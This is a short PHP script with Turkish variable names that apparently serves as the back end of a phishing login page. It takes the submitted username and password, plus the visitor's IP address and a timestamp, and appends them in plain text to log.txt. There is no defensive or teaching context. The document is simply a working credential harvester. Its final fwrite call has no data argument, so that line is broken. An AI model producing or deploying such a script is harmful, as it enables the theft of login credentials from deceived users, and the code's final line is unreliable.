<?php
$user = $_POST['username'];
$pass = $_POST['password'];
$ip = getenv('REMOTE_ADDR');
$tarih = date("Y/m/d h:i:s");
$dosya = fopen('log.txt', 'a');
fwrite($dosya, "IP       : " . $ip . "\r\n");
fwrite($dosya, "Date     : " . $tarih . "\r\n");
fwrite($dosya, "Username : " . $user . "\r\n");
fwrite($dosya, "Password : " . $pass . "\r\n");
fwrite($dosya, "------------------------------- " . "\r\n");
fwrite($dosya);

?>
